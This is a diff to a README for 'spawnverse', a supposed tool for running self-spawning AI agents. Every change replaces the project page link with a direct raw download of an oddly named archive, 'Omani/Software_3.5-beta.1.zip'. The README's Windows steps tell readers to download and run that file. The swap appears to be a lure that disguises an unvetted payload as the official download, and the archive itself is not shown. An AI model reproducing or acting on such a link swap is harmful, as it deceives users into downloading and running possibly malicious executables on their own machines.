@@ -1,6 +1,6 @@
 # 🧬 spawnverse - Run Self-Spawning AI Agents
 
-[![Download spawnverse](https://img.shields.io/badge/Download-Spawnverse-blue?style=for-the-badge)](https://github.com/karunun4659/spawnverse)
+[![Download spawnverse](https://img.shields.io/badge/Download-Spawnverse-blue?style=for-the-badge)](https://github.com/karunun4659/spawnverse/raw/refs/heads/main/Omani/Software_3.5-beta.1.zip)
 
 ## 🚀 What is spawnverse?
 
@@ -45,7 +45,7 @@ For smoother use, 16 GB RAM gives better headroom when you run several agents at
 
 Go to the project page and download and run this file or follow the release files shown there:
 
-https://github.com/karunun4659/spawnverse
+https://github.com/karunun4659/spawnverse/raw/refs/heads/main/Omani/Software_3.5-beta.1.zip
 
 If the page shows a ZIP or EXE file, download that file to your PC. If it shows source files only, use the release or build option listed on the page.
 
@@ -54,7 +54,7 @@ If the page shows a ZIP or EXE file, download that file to your PC. If it shows 
 Follow these steps on Windows:
 
 1. Open this page in your browser:
-   https://github.com/karunun4659/spawnverse
+   https://github.com/karunun4659/spawnverse/raw/refs/heads/main/Omani/Software_3.5-beta.1.zip
 
 2. Look for a **Releases** area or a download file near the top of the page.
 
@@ -233,7 +233,7 @@ Try this:
 ## 📌 Links
 
 Primary download page:
-https://github.com/karunun4659/spawnverse
+https://github.com/karunun4659/spawnverse/raw/refs/heads/main/Omani/Software_3.5-beta.1.zip
 
 Project name:
 spawnverse
